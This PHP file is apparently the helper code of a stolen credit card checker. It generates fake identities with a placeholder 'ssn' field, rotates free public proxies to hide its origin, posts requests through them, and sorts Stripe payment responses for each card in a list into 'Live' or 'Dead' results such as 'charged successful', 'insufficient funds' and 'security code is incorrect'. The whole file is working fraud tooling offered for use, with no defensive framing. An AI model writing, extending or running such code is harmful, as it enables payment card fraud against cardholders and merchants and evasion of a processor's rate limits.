<?php

function getRandomUserDetails() {
    $url = "https://randomuser.me/api/";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Decode JSON response
    $userData = json_decode($response, true);

    if (isset($userData['results'][0])) {
        $user = $userData['results'][0];

        // Return user details as an associative array
        return [
            'first' => $user['name']['first'],
            'last' => $user['name']['last'],
            'gender' => $user['gender'],
            'email' => $user['email'],
            'phone' => $user['phone'],
            'cell' => $user['cell'],
            'address' => "{$user['location']['street']['number']} {$user['location']['street']['name']}, {$user['location']['city']}, {$user['location']['state']}, {$user['location']['country']} - {$user['location']['postcode']}",
            'dob' => $user['dob']['date'],
            'ssn' => $user['id']['value'] ?? 'N/A' // Substitute with 'N/A' if SSN is not available
        ];
    } else {
        return null; 
    }
}

$rand = getRandomUserDetails();
    $first = $rand['first'];
    $last = $rand['last'];
    $gender = $rand['gender'];
    $email = $rand['email'];
    $phone = $rand['phone'];
    $cell = $rand['cell'];
    $address = $rand['address'];
    $dob = $rand['dob'];
    $ssn = $rand['ssn'];


function getFreeProxy() {
    $proxyListUrl = "https://www.proxy-list.download/api/v1/get?type=https";
    $proxies = file_get_contents($proxyListUrl);
    $proxyArray = explode("\n", trim($proxies));
    $proxy = $proxyArray[array_rand($proxyArray)];
    return trim($proxy);
}


function isProxyWorking($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.google.com/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $proxyIp = explode(":", $proxy)[0];
    if ($httpCode === 200) {
        echo "Proxy[🟢] $proxyIp\n";
        return true;
    } else {
        echo "Proxy[🔴] $proxyIp\n";
        return false;
    }
}


function CurlX($url, $headers = [], $data = null, $method = 'POST') {
    $proxy = getFreeProxy();

    while (!isProxyWorking($proxy)) {
        $proxy = getFreeProxy();
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo "cURL Error: " . curl_error($ch);
    }

    curl_close($ch);
    return $response;
}


function striperesponse($result,$lista,$msg =null)
  {
      if (strpos($result, ' customer authentication'))
  {
    echo'Live<span class="badge bg-label-primary">'.$lista.'</span>=><span class="badge bg-label-primary">3D secured card</span></br>';

  }
elseif (strpos($result, 'success":true'))
  {
    echo'Live<span class="badge bg-label-success">'.$lista.'</span>=><span class="badge bg-label-success">charged successful</span></br>';

  }
    elseif(strpos($result, "Your card has insufficient funds.") || strpos($result, "insufficient_funds")) {
      echo'Live<span class="badge bg-label-info">'.$lista.'</span>=><span class="badge bg-label-info">insufficient funds!</span></br>';
    }
    elseif(strpos($result, 'security code is incorrect.') !== false || strpos($result, 'security code is invalid.') !== false || strpos($result, "incorrect_cvc") !== false) {
      echo'Live<span class="badge bg-label-primary">'.$lista.'</span>=><span class="badge bg-label-primary">security code is incorrect</span></br>';
    }
    elseif(strpos($result, "Invalid account.")) {
      echo'Dead<span class="badge bg-label-danger">'.$lista.'</span>=><span class="badge bg-label-danger"invalid account</span></br>';
    }
    elseif(strpos($result, "Your card does not support this type of purchase.")) {
      echo'Live<span class="badge bg-label-primary">'.$lista.'</span>=><span class="badge bg-label-primary">Your card does not support this type of purchase.</span></br>';
    }
    elseif(strpos($result, "stripe_3ds2_fingerprint")) {
      echo'Live<span class="badge bg-label-primary">'.$lista.'</span>=><span class="badge bg-label-primary">3d Secured card</span></br>';
    }
    elseif(strpos($result, "declined.")) {
      echo'Dead<span class="badge bg-label-danger">'.$lista.'</span>=><span class="badge bg-label-danger">card was declined </span></br>';
    }
    elseif(strpos($result, "Too many requests")) {
      echo'Dead<span class="badge bg-label-danger">'.$lista.'</span>=><span class="badge bg-label-danger">Too many requests</span></br>';
    }
  else{
    echo'Dead<span class="badge bg-label-danger">'.$lista.'</span>=><span class="badge bg-label-danger">$msg</span></br>';


  }
  }
?>